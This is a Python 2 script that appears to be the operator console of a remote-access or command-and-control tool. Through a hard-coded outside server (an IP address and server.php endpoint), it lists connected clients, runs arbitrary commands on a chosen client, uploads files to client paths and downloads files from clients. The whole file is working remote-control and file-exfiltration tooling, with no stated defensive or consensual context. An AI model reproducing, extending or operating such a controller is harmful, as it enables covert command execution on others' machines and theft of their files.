from __future__ import print_function
import requests
import time
import threading
import os, sys, json, time

# design constants
# serverip = 'localhost'
serverip = '18.213.1.57'
server_file = 'http://'+serverip+'/joseph/files/'
server_uri = 'http://'+serverip+'/joseph/server.php'
clients = []
actions = [
    'executeCommand', 
    'getClientList', 
    'get_command_result', 
    'upload', 
    'get_client_upload',
    'get_client_download',
]

event = threading.Event()

# post request to server
def post(data):
    try:
        response = requests.post(server_uri, data = data)
        return response.text
    except Exception as e:
        return e

# show snipping
def snipping():
    # function to print snipping
    animation = "|/-\\"
    idx = 0
    while True:
        print(animation[idx % len(animation)], end="\r")
        idx += 1
        time.sleep(0.05)
        if event.is_set():
            print(" ", end="\r")
            break

# get filename from filepath:
def getFileName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a=y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[a+1:]
    return filename

# get foldername from filepath:
def getFolderName(filepath):
    x = filepath.rfind("/")
    y = filepath.rfind("\\")
    a = y
    if x > y:
        a=x
    if a == -1:
        filename = filepath
    else:
        filename = filepath[0:a]
    return filename

# print string with animation effect
def animation_print(message, speed=0.02):
    for character in message:
        print (character, end = "")
        time.sleep(speed)
    print()

# load file by splite chunk size
def read_in_chunks(file_object, CHUNK_SIZE):
    while True:
        data = file_object.read(CHUNK_SIZE)
        if not data:
            break
        yield data

# Upload file
def upload(file, url, destfoler, client_id):
    content_name = getFileName(file).replace("/", "\\")
    content_path = os.path.abspath(file)
    content_size = os.stat(content_path).st_size 
    print(content_name, content_path, content_size)
  
    file_object = open(content_path, "rb")
    index = 0
    offset = 0
    headers = {}
    i=0
    for chunk in read_in_chunks(file_object, 409600):
        offset = index + len(chunk)
        headers['Content-Range'] = 'bytes %s-%s/%s' % (index, offset - 1, content_size) 
        index = offset 
        try:         
            file = {"myfile": chunk}
            r = requests.post(
                url, 
                files=file, 
                headers=headers, 
                data={
                    'action': 'upload', 
                    'cma_msg': destfoler, 
                    'client_id': client_id, 
                    'chunk': i, 
                    'chunks': (content_size/409600)+1
                    }
                )
            i+=1
            done = int(50 * offset / content_size)
            sys.stdout.write("\r[%s%s]" % ('=' * done, ' ' * (50-done)) )    
            sys.stdout.flush()
        except Exception as e:
            pass
            sys.stdout.flush()
    return 'success'

# select options
def main_menu(options):
    animation_print("\nPlease choose action:")

    for idx, element in enumerate(options):
        animation_print("{}) {}".format(idx + 1, element))

    while True:
        i = raw_input("Enter number: ")
        if i:
            try:
                if 0 < int(i) <= len(options):
                    return int(i) - 1
                else:
                    animation_print("Please input number in list")
            except:
                animation_print("Please input number")

# module to input client id
def input_clinetId():
    while True:
        client_id = raw_input("\ninput client id: ")
        if client_id:
            result = post({'action': actions[1]})
            clients = json.loads(result)
            if client_id in clients: 
                break
            else: 
                animation_print('\n !!!Not exist, Please check list')
                animation_print(result)
    return client_id

# print welcome message
def welcome():
    print(" _       __________    __________  __  _________")
    print("| |     / / ____/ /   / ____/ __ \/  |/  / ____/")
    print("| | /| / / __/ / /   / /   / / / / /|_/ / __/")
    print("| |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___")
    print("|__/|__/_____/_____/\____/\____/_/  /_/_____/")

############################## START MAIN FUNCTION #############################
if __name__ == "__main__":
    welcome()
    while True:
        options = ["Get Clients List", "Execute Command", "Upload File", "Download File"]
        
        res = main_menu(options)
        
        if options[res] == "Get Clients List":
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            result = post({'action': actions[1]})
            event.set()
            time.sleep(0.1)
            animation_print(result)
            event.clear()
        
        elif options[res] == "Execute Command":
            client_id = input_clinetId()
            cma_msg = raw_input("input command: ")
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            post({'action': actions[0], 'client_id': client_id, 'cma_msg': cma_msg})
            i=0
            while i < 20:
                time.sleep(1)
                i += 1
                try:
                    result = post({'action': actions[2], 'client_id': client_id})
                    if(result.encode('utf8')[-2:] != 'no'):
                        event.set()
                        time.sleep(0.1)
                        print(result)
                        event.clear()
                        break
                except Exception as e:
                    event.set()
                    time.sleep(0.1)
                    animation_print(e)
                    event.clear()
            if i==20:
                event.set()
                time.sleep(0.1)
                animation_print(result)
                event.clear()
        
        elif options[res] == "Upload File":
            client_id = input_clinetId()
            filepath = raw_input("input filepath or drag file: ").replace("/", "\\")
            # print("input filepath %s" % cma_msg, end="")
            destpath = raw_input("input destination path: ").replace("/", "\\")
            res = upload(filepath, server_uri, destpath, client_id)
        
        elif options[res] == "Download File":
            client_id = input_clinetId()
            filepath  = raw_input("input filename: ").replace("/", "\\")
            filename  = getFileName(filepath)

            destpath  = raw_input("input destination path: ").replace("/", "\\")
            destfoler = getFolderName(destpath)
            
            try:
                if not os.path.exists(destfoler):
                    os.makedirs(destfoler)
                    animation_print(destfoler+' is created')
            except Exception as e:
                destfoler = '.'
            t1 = threading.Thread(target=snipping, args=())
            t1.start()
            post({'action':'download', 'cma_msg':filepath, 'client_id': client_id})
            # i=0
            while True:
                time.sleep(1)
                result = post({'action': actions[4], 'client_id': client_id})
                if (result.encode('utf8')[-2:] == 'le'):
                    event.set()
                    time.sleep(0.1)
                    animation_print(result)
                    event.clear()
                    break
                elif(result.encode('utf8')[-2:] == 'ed'):
                    # file_url = server_file+filename
                    # r = requests.get(file_url) # create HTTP response object   
                    # with open(destpath,'wb') as f:
                    #     f.write(r.content)

                    event.set()
                    time.sleep(0.1)
                    event.clear()

                    with open(destpath, "wb") as f:
                        # print("Downloading %s" % file_name)
                        response = requests.get(server_file+filename, stream=True)
                        total_length = response.headers.get('content-length')

                        if total_length is None: # no content length header
                            f.write(response.content)
                        else:
                            dl = 0
                            total_length = int(total_length)
                            for data in response.iter_content(chunk_size=4096):
                                dl += len(data)
                                f.write(data)
                                done = int(50 * dl / total_length)
                                sys.stdout.write("\r[%s%s]" % ('=' * done, ' ' * (50-done)) )    
                                sys.stdout.flush()

                    animation_print('\nSuccessfully downloaded')
                    break
                    
            
############################### END MAIN FUNCTION ##############################
